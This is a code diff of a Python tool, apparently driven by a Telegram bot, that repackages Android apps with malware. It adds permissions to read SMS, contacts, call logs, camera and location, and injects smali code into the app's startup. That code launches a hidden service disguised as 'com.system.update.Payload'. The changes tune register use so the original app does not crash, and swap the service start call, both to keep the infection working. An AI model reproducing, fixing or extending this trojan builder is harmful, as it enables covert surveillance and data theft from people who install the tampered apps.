@@ -54,13 +54,12 @@ def inject_manifest(manifest_path):
     root = tree.getroot()
     ns = '{http://schemas.android.com/apk/res/android}'
     
-    # TAMBAHIN FOREGROUND_SERVICE_DATA_SYNC
     permissions = ["android.permission.INTERNET", "android.permission.READ_SMS", "android.permission.RECEIVE_SMS", 
                    "android.permission.READ_CONTACTS", "android.permission.READ_CALL_LOG", "android.permission.CAMERA", 
                    "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE", 
                    "android.permission.ACCESS_FINE_LOCATION", "android.permission.RECEIVE_BOOT_COMPLETED", 
-                   "android.permission.FOREGROUND_SERVICE", "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
-                   "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", "android.permission.POST_NOTIFICATIONS"]
+                   "android.permission.FOREGROUND_SERVICE", "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
+                   "android.permission.POST_NOTIFICATIONS"]
                    
     for perm in permissions:
         if not any(p.get(ns + 'name') == perm for p in root.findall('uses-permission')):
@@ -116,18 +115,18 @@ def inject_permission_popup(apk_out_dir):
                         if ".locals" in lines[j]: lines[j] = f"    .locals {int(parts[1]) + 5}\n"
                         else: lines[j] = f"    .registers {int(parts[1]) + 5}\n"
                         
-                        # PAKAI startForegroundService LAGI (Sekarang izinnya udah lengkap)
+                        # PAKAI v4 & v5 (Jangan v0, v1 biar aplikasi asli ga crash)
                         inject_code = (
-                            "\n    const-string v2, \"Injection Active\"\n"
-                            "    const/4 v3, 0x1\n"
-                            "    invoke-static {p0, v2, v3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;\n"
-                            "    move-result-object v2\n"
-                            "    invoke-virtual {v2}, Landroid/widget/Toast;->show()V\n\n"
+                            "\n    const-string v4, \"Injection Active\"\n"
+                            "    const/4 v5, 0x1\n"
+                            "    invoke-static {p0, v4, v5}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;\n"
+                            "    move-result-object v4\n"
+                            "    invoke-virtual {v4}, Landroid/widget/Toast;->show()V\n\n"
                             "    invoke-static {p0}, Lcom/system/update/Payload;->askPermissions(Landroid/app/Activity;)V\n\n"
-                            "    new-instance v0, Landroid/content/Intent;\n"
-                            "    const-class v1, Lcom/system/update/Payload;\n"
-                            "    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n"
-                            "    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;\n"
+                            "    new-instance v4, Landroid/content/Intent;\n"
+                            "    const-class v5, Lcom/system/update/Payload;\n"
+                            "    invoke-direct {v4, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n"
+                            "    invoke-virtual {p0, v4}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n"
                         )
                         lines.insert(j + 1, inject_code)
                         injected = True
@@ -136,7 +135,7 @@ def inject_permission_popup(apk_out_dir):
 
     if injected:
         with open(smali_path, "w", encoding="utf-8") as f: f.writelines(lines)
-        return "✅ Pop-up, Toast & StartService disuntikkan."
+        return "✅ Pop-up & StartService disuntikkan (Aman)."
     else: return "⚠️ Gagal nyuntik onCreate."
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
